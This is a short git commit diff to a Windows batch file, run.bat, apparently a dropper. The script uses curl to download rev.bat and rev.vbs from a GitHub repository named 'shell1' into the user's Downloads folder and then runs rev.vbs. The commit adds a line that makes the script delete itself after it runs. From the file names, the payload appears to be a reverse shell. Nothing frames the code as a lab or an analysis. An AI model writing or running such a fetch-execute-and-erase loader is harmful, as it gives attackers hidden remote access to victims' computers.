aa28fbb6d0a1e23acfece5897a97a1f8cc9ff238
Omar Samy <osamy7592@gmail.com>
2024-05-04 17:20:24 +0300

    Update run.bat

--- run.bat
+++ run.bat
@@ -3,4 +3,5 @@ set "downloads_dir=%USERPROFILE%\Downloads"
 curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/rev.bat -o "%downloads_dir%\rev.bat"
 curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/rev.vbs -o "%downloads_dir%\rev.vbs"
 call "%downloads_dir%\rev.vbs"
-exit
+del "%~f0"
+
